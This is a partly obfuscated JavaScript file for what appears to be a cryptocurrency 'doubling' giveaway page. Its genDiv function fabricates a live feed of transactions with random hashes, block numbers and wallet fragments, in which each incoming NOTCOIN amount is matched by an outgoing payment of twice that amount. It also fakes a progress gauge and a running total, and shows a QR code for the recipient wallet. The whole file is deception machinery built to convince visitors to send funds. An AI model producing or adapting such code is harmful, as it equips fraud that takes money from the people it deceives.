function copy(text) {
    let input = document.createElement('textarea');
    input.innerHTML = text;
    document.body.appendChild(input);
    input.select();
    document.execCommand('copy');
    document.body.removeChild(input);
}

$(document).ready(function () {
    $(".Gaugemeter").gaugeMeter();
});

function randomString(_0xe480x2) {
    var _0xe480x3 = 'rp';
    var _0xe480x4 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var _0xe480x5 = _0xe480x4['length'];
    for (var _0xe480x6 = 0; _0xe480x6 < _0xe480x2; _0xe480x6++) {
        _0xe480x3 += _0xe480x4['charAt'](Math['floor'](Math['random']() * _0xe480x5))
    }
    return _0xe480x3
}

function randomStringHashBTC(_0xe480x2) {
    var _0xe480x3 = '';
    var _0xe480x4 = 'bacfed0123456789';
    var _0xe480x5 = _0xe480x4['length'];
    for (var _0xe480x6 = 0; _0xe480x6 < _0xe480x2; _0xe480x6++) {
        _0xe480x3 += _0xe480x4['charAt'](Math['floor'](Math['random']() * _0xe480x5))
    }
    ;
    return _0xe480x3
}

var divCounter = 0;

function randomInteger(min, max) {
    let rand = min + Math.random() * (max - min);
    return Math.round(rand);
}

function randomIntegerBTC(min, max) {
    let rand = min + Math.random() * (max - min);
    return rand.toFixed(2);
}

function getRundomMnogitel() {
    let asd = [1, 0.1, 0.01];
    let getRandom = Math.floor(Math.random() * asd.length);
    return asd[getRandom];
}

function genDiv() {
    divCounter++;
    let valet = document.getElementById("walletaddress").innerText;
    var _0xe480x9 = `${'<div class="item"><div class="top"><div class="data"><div class="data-item">{t1}</div><div class="data-item">{t2}</div><div class="data-item" id="btcstr">{t4}</div><div class="data-item">{t5}</div><div class="data-item">{t6}</div><div class="data-item">{t3}</div><div class="data-item">{t7}</div><div class="data-item">{t8}</div></div></div><div class="bottom"><div class="data"><div class="data-item">{b1}</div><div class="data-item">{b2}</div><div class="data-item">{b4}</div><div class="data-item">{b5}</div><div class="data-item" id="btcstr">{b6}</div><div class="data-item">{b3}</div><div class="data-item">{b7}</div><div class="data-item">{b8}</div></div></div></div>'}`;
    let _0xe480xa = randomStringHashBTC(10) + '...';
    let _0xe480xb = "0" + randomInteger(1, 9) + randomInteger(1, 9) + randomInteger(1, 9);
    let _0xe480xc = 'right now';
    let _0xe480xd = '' + randomString(9) + '...';
    let _0xe480xe = 'IN';
    let _0xe480xf = valet.substring(0, 10);
    let valueSend = randomIntegerBTC(minSend, maxSend);
    let _0xe480x10 = valueSend + ' NOTCOIN';
    let _0xe480x11 = ((Math['random']() * 0.09 * getRundomMnogitel()) + 0.001 * getRundomMnogitel())['toFixed'](5);
    let _0xe480x12 = randomStringHashBTC(10) + '...';
    let _0xe480x13 = "616" + randomInteger(1, 9) + randomInteger(1, 9) + randomInteger(1, 9);
    let _0xe480x14 = 'right now';
    let _0xe480x15 = _0xe480xf.slice(0, 10) + "...";
    let _0xe480x16 = 'OUT';
    let _0xe480x17 = _0xe480xd;
    let _0xe480x18 = (valueSend * 2) + ' NOT';
    let _0xe480x19 = ((Math['random']() * 0.09 * getRundomMnogitel()) + 0.001 * getRundomMnogitel())['toFixed'](5);
    _0xe480x9 = _0xe480x9['replace']('{t1}', _0xe480x12);
    _0xe480x9 = _0xe480x9['replace']('{t2}', _0xe480x13);
    _0xe480x9 = _0xe480x9['replace']('{t3}', _0xe480x14);
    _0xe480x9 = _0xe480x9['replace']('{t4}', _0xe480x15);
    _0xe480x9 = _0xe480x9['replace']('{t5}', _0xe480x16);
    _0xe480x9 = _0xe480x9['replace']('{t6}', _0xe480x17);
    _0xe480x9 = _0xe480x9['replace']('{t7}', _0xe480x18);
    _0xe480x9 = _0xe480x9['replace']('{t8}', _0xe480x19);
    _0xe480x9 = _0xe480x9['replace']('{b1}', _0xe480xa);
    _0xe480x9 = _0xe480x9['replace']('{b2}', _0xe480xb);
    _0xe480x9 = _0xe480x9['replace']('{b3}', _0xe480xc);
    _0xe480x9 = _0xe480x9['replace']('{b4}', _0xe480xd);
    _0xe480x9 = _0xe480x9['replace']('{b5}', _0xe480xe);
    _0xe480x9 = _0xe480x9['replace']('{b6}', _0xe480x15);
    _0xe480x9 = _0xe480x9['replace']('{b7}', _0xe480x10);
    _0xe480x9 = _0xe480x9['replace']('{b8}', _0xe480x11);
    var _0xe480x1a = $(_0xe480x9)['prependTo']('.table-body');
    $('.item')['each'](function () {
        var _0xe480x6 = $(this)['index']();
        if (_0xe480x6 > 0) {
            $(this)['find']('.top .data div')['eq'](5)['html'](_0xe480x6 + ' min');
            $(this)['find']('.bottom .data div')['eq'](5)['html'](_0xe480x6 + ' min')
        }
    });
    var send = Math.round(valueSend * 2);
    currentCount = eval(currentCount) + eval(send);
    if (localStorage.getItem("barXRP")) {
        if (localStorage.getItem("barXRP") >= MinClearToReal) {
            localStorage.setItem("barXRP", currentCountREAL);
            currentCount = currentCountREAL;
        } else if (localStorage.getItem("barXRP")) {
            localStorage.setItem("barXRP", currentCount);
        }
    } else {
        localStorage.setItem("barXRP", currentCountREAL);
    }

    const lang = 'en-US';
    let titleCount = document.getElementById("titlecount").innerText = count.toLocaleString(lang);
    let countLoad = document.getElementById("countload" ).innerText = count.toLocaleString(lang);
    let countCurrent = document.getElementById("countcurrent").innerText = currentCount.toLocaleString(lang);
    let titleWallet = document.getElementById("wallet").innerText = wallet.toLocaleString(lang);
    let adressWaller = document.getElementById("walletaddress").innerText = wallet.toLocaleString(lang);
    let percentCount = currentCount * 100 / count;
    let cicrele = document.getElementById("GaugeMeter_1").setAttribute('data-percent', percentCount);

    setTimeout(function () {
        _0xe480x1a['find']('.top')['fadeIn']();
        _0xe480x1a['find']('.bottom .data div')['eq'](5)['html']('right now')
    }, 2000)
}

$(document).ready(function () {
    $("#nav-mb").on("click", "a", function (event) {
        event.preventDefault();
        var id = $(this).attr('href'), top = $(id).offset().top;
        $('body,html').animate({scrollTop: top}, 1500);
    });

    let qrcode = new QRCode({
        content: window.wallet,
        padding: 2,
        width: 180,
        height: 180,
        color: "#000000",
        background: "#ffffff",
        join: true,
        ecl: "L",
    }).svg();
    $(".qrcode").append(qrcode);

    genDiv();
    genDiv();
    genDiv();
    genDiv();
    genDiv();

    setInterval(function () {
        genDiv()
    }, 12500);
});